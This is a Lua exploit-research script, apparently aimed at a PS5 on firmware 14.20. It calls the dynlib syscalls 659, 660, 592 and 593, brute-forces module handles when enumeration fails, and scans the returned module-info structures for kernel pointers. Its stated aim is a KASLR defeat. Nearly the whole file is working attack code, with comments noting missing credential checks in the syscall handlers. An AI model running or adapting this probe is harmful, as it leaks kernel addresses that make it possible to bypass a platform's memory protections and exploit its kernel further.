-- CRASH_CLASS: LOW
-- PROBE 220a: sys 659/660 dynlib module enumeration — KASLR defeat via extended module info
--
-- Context: Handler analysis (sys_659.md, sys_660.md) reveals:
--   sys 659 (dynlib_get_list2): enumerates ALL module handles via process+0x3e8
--     context. No credential check. Args: handles_out_ptr, capacity, count_out_ptr.
--     Returns array of uint32 handles + count via copyout.
--   sys 660 (dynlib_get_info2): returns 0x160-byte extended module info per handle.
--     No credential check. Args: handle(u32), struct_ptr(0x160 bytes, first 8B = size).
--     Requires exact size=0x160 in first 8 bytes of struct.
--
-- NEITHER syscall has EVER been tested on ANY firmware version.
-- This is the #1 priority KASLR vector because:
--   - LOW crash risk (read-only queries on own-process data)
--   - Large output (0x160 = 352 bytes per module × N modules)
--   - Module info structures commonly contain kernel VAs (mapbase, text_va, tls)
--   - Different code path from sys 593 (dynlib_get_info, returns -1)
--
-- Also tests sys 593 and sys 592 (dynlib_get_list) for comparison.
--
-- Section A: sys 659 module handle enumeration
-- Section B: sys 660 extended module info per handle + kernel pointer scan
-- Section C: sys 592/593 comparison (known-working paths)
-- Section D: Broad qword scan of all module info for kernel pointer patterns

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 220a: DYNLIB MODULE ENUMERATION — KASLR HUNT ===")
print("Section: " .. TEST_SECTION)
print("Firmware: 14.20")
print("")

-- helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function is_kptr(val)
    local h, l = get_hi_lo(val)
    -- Kernel VA: 0xFFFF800000000000 - 0xFFFFFFFEFFFFFFFF
    -- High dword must be >= 0xFFFF8000 and < 0xFFFFFFFF
    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then return true end
    -- Also check for 0xFFFFFFFExxxxxxxx (upper kernel range)
    if h == 0xFFFFFFFE then return true end
    return false
end
local function scan_buffer_for_kptrs(base, size, label)
    local found = 0
    for off = 0, size - 8, 8 do
        local ok, val = pcall(function() return memory.read_qword(base + off) end)
        if ok and val then
            local h, l = get_hi_lo(val)
            if is_kptr(val) then
                found = found + 1
                print(string.format("  [KPTR!] %s +0x%03X = %s", label, off, fmt(val)))
            end
            -- Also log any non-zero values for analysis
            if h ~= 0 or l ~= 0 then
                if not is_kptr(val) then
                    -- Only log first 5 non-zero non-kptr per module to avoid spam
                    if found < 5 then
                        print(string.format("  [data]  %s +0x%03X = %s", label, off, fmt(val)))
                    end
                end
            end
        end
    end
    return found
end

local sc659 = make_syscall(659)  -- dynlib_get_list2
local sc660 = make_syscall(660)  -- dynlib_get_info2
local sc593 = make_syscall(593)  -- dynlib_get_info (comparison)
local sc592 = make_syscall(592)  -- dynlib_get_list (comparison)
local sc624 = make_syscall(624)  -- VM timestamp baseline
local sc20  = make_syscall(20)   -- getpid

print("pid=" .. to_num(sc20()))
local vm_base = to_num(sc624())
print("vm_timestamp_baseline=" .. vm_base)

if TEST_SECTION == "A" then
    print("--- Section A: sys 659 module handle enumeration ---")
    print("")

    -- Allocate handles buffer (max 256 handles × 4 bytes = 1024 bytes)
    local handles_buf = memory.alloc(0x400)
    local count_buf = memory.alloc(0x10)
    local handles_addr = handles_buf
    local count_addr = count_buf

    print("handles_buf=" .. fmt(handles_addr))
    print("count_buf=" .. fmt(count_addr))

    -- Zero both buffers
    for i = 0, 0x3FF, 4 do pcall(function() memory.write_dword(handles_addr + i, 0) end) end
    for i = 0, 0xF, 4 do pcall(function() memory.write_dword(count_addr + i, 0) end) end

    -- Test 1: sys 659 with capacity=256
    print("")
    print("[TEST 1] sys 659(handles, 256, count)")
    local ok1, rv1 = pcall(function()
        return sc659(handles_addr, 256, count_addr)
    end)
    print("  ok=" .. tostring(ok1) .. " rv=" .. (ok1 and fmt(rv1) or tostring(rv1)))

    if ok1 then
        -- Read count
        local cnt = safe_rd(count_addr)
        print("  count=" .. tostring(cnt))

        if cnt and cnt > 0 and cnt < 256 then
            print("  MODULE HANDLES FOUND: " .. cnt)
            for i = 0, cnt - 1 do
                local h = safe_rd(handles_addr + i * 4)
                print(string.format("    handle[%d] = 0x%X", i, h or 0))
            end
        else
            -- Scan for any non-zero data in handles buffer
            print("  Scanning handles buffer for any data:")
            for i = 0, 63 do
                local v = safe_rd(handles_addr + i * 4)
                if v and v ~= 0 then
                    print(string.format("    +0x%03X = 0x%08X", i * 4, v))
                end
            end
        end

        -- Also read count as qword (might be 64-bit)
        local cnt_q = safe_rq(count_addr)
        print("  count_qword=" .. fmt(cnt_q))
    end

    -- Test 2: sys 659 with capacity=0 (boundary)
    print("")
    print("[TEST 2] sys 659(handles, 0, count)")
    for i = 0, 0xF, 4 do pcall(function() memory.write_dword(count_addr + i, 0) end) end
    local ok2, rv2 = pcall(function()
        return sc659(handles_addr, 0, count_addr)
    end)
    print("  ok=" .. tostring(ok2) .. " rv=" .. (ok2 and fmt(rv2) or tostring(rv2)))
    if ok2 then
        local cnt2 = safe_rd(count_addr)
        print("  count=" .. tostring(cnt2))
    end

    -- Test 3: sys 659 with capacity=1 (minimum)
    print("")
    print("[TEST 3] sys 659(handles, 1, count)")
    for i = 0, 0xF, 4 do pcall(function() memory.write_dword(count_addr + i, 0) end) end
    for i = 0, 3, 4 do pcall(function() memory.write_dword(handles_addr + i, 0) end) end
    local ok3, rv3 = pcall(function()
        return sc659(handles_addr, 1, count_addr)
    end)
    print("  ok=" .. tostring(ok3) .. " rv=" .. (ok3 and fmt(rv3) or tostring(rv3)))
    if ok3 then
        local cnt3 = safe_rd(count_addr)
        local h0 = safe_rd(handles_addr)
        print("  count=" .. tostring(cnt3) .. " handle[0]=" .. string.format("0x%X", h0 or 0))
    end

    print("")
    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: sys 660 extended module info + kernel pointer scan ---")
    print("")

    -- First enumerate handles via sys 659
    local handles_buf = memory.alloc(0x400)
    local count_buf = memory.alloc(0x10)
    local handles_addr = handles_buf
    local count_addr = count_buf

    for i = 0, 0x3FF, 4 do pcall(function() memory.write_dword(handles_addr + i, 0) end) end
    for i = 0, 0xF, 4 do pcall(function() memory.write_dword(count_addr + i, 0) end) end

    print("[ENUM] sys 659 to get handles...")
    local ok_e, rv_e = pcall(function() return sc659(handles_addr, 256, count_addr) end)
    local cnt_e = safe_rd(count_addr) or 0
    print("  rv=" .. (ok_e and fmt(rv_e) or "fail") .. " count=" .. cnt_e)

    -- If 659 failed, try hardcoded handle values 0-15
    local handles = {}
    if ok_e and cnt_e > 0 and cnt_e < 256 then
        for i = 0, cnt_e - 1 do
            local h = safe_rd(handles_addr + i * 4)
            if h then table.insert(handles, h) end
        end
    else
        print("  sys 659 did not return handles, trying brute-force handles 0-15")
        for i = 0, 15 do table.insert(handles, i) end
    end

    -- Allocate 0x160-byte info struct
    local info_buf = memory.alloc(0x200)
    local info_addr = info_buf
    local total_kptrs = 0

    for idx, handle in ipairs(handles) do
        -- Zero buffer
        for i = 0, 0x15F, 4 do pcall(function() memory.write_dword(info_addr + i, 0) end) end

        -- Set first 8 bytes to size = 0x160 (required by handler)
        pcall(function() memory.write_qword(info_addr, uint64(0x160)) end)

        print(string.format("\n[MODULE handle=%d (0x%X)]", handle, handle))
        local ok_i, rv_i = pcall(function()
            return sc660(handle, info_addr)
        end)
        print("  rv=" .. (ok_i and fmt(rv_i) or tostring(rv_i)))

        if ok_i then
            local rv_num = to_num(rv_i)
            if rv_num == 0 then
                print("  INFO RETURNED — scanning for kernel pointers:")

                -- Full qword scan of 0x160 bytes
                for off = 0, 0x158, 8 do
                    local val = safe_rq(info_addr + off)
                    if val then
                        local h, l = get_hi_lo(val)
                        if h ~= 0 or l ~= 0 then
                            local tag = ""
                            if is_kptr(val) then
                                tag = " *** KERNEL POINTER ***"
                                total_kptrs = total_kptrs + 1
                            end
                            print(string.format("    +0x%03X = %s%s", off, fmt(val), tag))
                        end
                    end
                end

                -- Also dump dwords for finer granularity in key regions
                print("  Key dword fields:")
                for _, off in ipairs({0x00, 0x04, 0x08, 0x0C, 0x10, 0x14, 0x18, 0x1C,
                                       0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58,
                                       0x100, 0x108, 0x110, 0x118, 0x120, 0x128, 0x140, 0x148, 0x150, 0x158}) do
                    local v = safe_rd(info_addr + off)
                    if v and v ~= 0 then
                        print(string.format("    dword +0x%03X = 0x%08X", off, v))
                    end
                end
            else
                print("  non-zero return: " .. fmt(rv_i) .. " (error code)")
            end
        end

        -- Limit to first 20 handles to avoid timeout
        if idx >= 20 then
            print("\n[LIMIT] Stopping after 20 handles")
            break
        end
    end

    print("\n=== TOTAL KERNEL POINTERS FOUND: " .. total_kptrs .. " ===")
    if total_kptrs > 0 then
        print("*** KASLR DEFEAT: kernel pointer(s) found in module info! ***")
    end

    print("")
    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: sys 592/593 comparison ---")
    print("")

    -- sys 592 (dynlib_get_list): args = handles_out, capacity, count_out
    local handles_buf = memory.alloc(0x400)
    local count_buf = memory.alloc(0x10)
    local handles_addr = handles_buf
    local count_addr = count_buf

    for i = 0, 0x3FF, 4 do pcall(function() memory.write_dword(handles_addr + i, 0) end) end
    for i = 0, 0xF, 4 do pcall(function() memory.write_dword(count_addr + i, 0) end) end

    print("[TEST 1] sys 592 dynlib_get_list(handles, 256, count)")
    local ok1, rv1 = pcall(function() return sc592(handles_addr, 256, count_addr) end)
    print("  ok=" .. tostring(ok1) .. " rv=" .. (ok1 and fmt(rv1) or tostring(rv1)))
    if ok1 then
        local cnt = safe_rd(count_addr)
        print("  count=" .. tostring(cnt))
        if cnt and cnt > 0 and cnt < 256 then
            for i = 0, math.min(cnt - 1, 19) do
                local h = safe_rd(handles_addr + i * 4)
                print(string.format("    handle[%d] = 0x%X", i, h or 0))
            end
        end
    end

    -- sys 593 (dynlib_get_info): args = handle(u32), info_ptr
    -- info struct size varies; try 0x1a8 (standard PS5 dynlib_info)
    print("")
    print("[TEST 2] sys 593 dynlib_get_info(handle=0)")
    local info593 = memory.alloc(0x200)
    local info593_addr = info593
    for i = 0, 0x1FF, 4 do pcall(function() memory.write_dword(info593_addr + i, 0) end) end
    -- Set size field
    pcall(function() memory.write_qword(info593_addr, uint64(0x1a8)) end)

    local ok2, rv2 = pcall(function() return sc593(0, info593_addr) end)
    print("  ok=" .. tostring(ok2) .. " rv=" .. (ok2 and fmt(rv2) or tostring(rv2)))
    if ok2 and to_num(rv2) == 0 then
        print("  Info returned, scanning:")
        scan_buffer_for_kptrs(info593_addr, 0x1a8, "info593")
    end

    -- Compare: try sys 660 with same handle
    print("")
    print("[TEST 3] sys 660 dynlib_get_info2(handle=0) for comparison")
    local info660 = memory.alloc(0x200)
    local info660_addr = info660
    for i = 0, 0x1FF, 4 do pcall(function() memory.write_dword(info660_addr + i, 0) end) end
    pcall(function() memory.write_qword(info660_addr, uint64(0x160)) end)

    local ok3, rv3 = pcall(function() return sc660(0, info660_addr) end)
    print("  ok=" .. tostring(ok3) .. " rv=" .. (ok3 and fmt(rv3) or tostring(rv3)))
    if ok3 and to_num(rv3) == 0 then
        print("  Info2 returned, scanning:")
        scan_buffer_for_kptrs(info660_addr, 0x160, "info660")
    end

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Broad deep scan of ALL module info ---")
    print("")

    -- Get handles from sys 659 or 592
    local handles_buf = memory.alloc(0x400)
    local count_buf = memory.alloc(0x10)
    local handles_addr = handles_buf
    local count_addr = count_buf

    for i = 0, 0x3FF, 4 do pcall(function() memory.write_dword(handles_addr + i, 0) end) end
    for i = 0, 0xF, 4 do pcall(function() memory.write_dword(count_addr + i, 0) end) end

    -- Try sys 659 first, fallback to sys 592
    local handles = {}
    local ok_e, rv_e = pcall(function() return sc659(handles_addr, 256, count_addr) end)
    local cnt_e = safe_rd(count_addr) or 0
    if ok_e and cnt_e > 0 and cnt_e < 256 then
        for i = 0, cnt_e - 1 do
            local h = safe_rd(handles_addr + i * 4)
            if h then table.insert(handles, h) end
        end
        print("Got " .. #handles .. " handles from sys 659")
    else
        -- Try sys 592
        for i = 0, 0x3FF, 4 do pcall(function() memory.write_dword(handles_addr + i, 0) end) end
        for i = 0, 0xF, 4 do pcall(function() memory.write_dword(count_addr + i, 0) end) end
        local ok_f, rv_f = pcall(function() return sc592(handles_addr, 256, count_addr) end)
        cnt_e = safe_rd(count_addr) or 0
        if ok_f and cnt_e > 0 and cnt_e < 256 then
            for i = 0, cnt_e - 1 do
                local h = safe_rd(handles_addr + i * 4)
                if h then table.insert(handles, h) end
            end
            print("Got " .. #handles .. " handles from sys 592")
        else
            -- Brute force handles 0-31
            for i = 0, 31 do table.insert(handles, i) end
            print("No handles from enum, brute-forcing 0-31")
        end
    end

    -- Query ALL handles with sys 660, collect all unique kernel pointers
    local all_kptrs = {}
    local info_buf = memory.alloc(0x200)
    local info_addr = info_buf

    for idx, handle in ipairs(handles) do
        for i = 0, 0x15F, 4 do pcall(function() memory.write_dword(info_addr + i, 0) end) end
        pcall(function() memory.write_qword(info_addr, uint64(0x160)) end)

        local ok_i, rv_i = pcall(function() return sc660(handle, info_addr) end)
        if ok_i and to_num(rv_i) == 0 then
            -- Scan every qword
            for off = 0, 0x158, 8 do
                local val = safe_rq(info_addr + off)
                if val and is_kptr(val) then
                    local key = fmt(val)
                    if not all_kptrs[key] then
                        all_kptrs[key] = { handle = handle, offset = off }
                        print(string.format("*** KPTR: handle=%d +0x%03X = %s ***", handle, off, key))
                    end
                end
            end
        end
    end

    -- Also try sys 593 for comparison
    print("\n--- sys 593 comparison scan ---")
    for idx, handle in ipairs(handles) do
        if idx > 10 then break end
        for i = 0, 0x1FF, 4 do pcall(function() memory.write_dword(info_addr + i, 0) end) end
        pcall(function() memory.write_qword(info_addr, uint64(0x1a8)) end)

        local ok_i, rv_i = pcall(function() return sc593(handle, info_addr) end)
        if ok_i and to_num(rv_i) == 0 then
            for off = 0, 0x1A0, 8 do
                local val = safe_rq(info_addr + off)
                if val and is_kptr(val) then
                    local key = fmt(val)
                    if not all_kptrs[key] then
                        all_kptrs[key] = { handle = handle, offset = off, source = "593" }
                        print(string.format("*** KPTR(593): handle=%d +0x%03X = %s ***", handle, off, key))
                    end
                end
            end
        end
    end

    -- Summary
    local kptr_count = 0
    for _ in pairs(all_kptrs) do kptr_count = kptr_count + 1 end
    print("\n=== UNIQUE KERNEL POINTERS FOUND: " .. kptr_count .. " ===")
    if kptr_count > 0 then
        print("*** KASLR DEFEAT CANDIDATE(S) IDENTIFIED ***")
        for ptr, info in pairs(all_kptrs) do
            print(string.format("  %s @ handle %d +0x%03X%s", ptr, info.handle, info.offset,
                info.source and (" via sys " .. info.source) or ""))
        end
    end

    print("")
    print("[DONE] Section D complete")
end
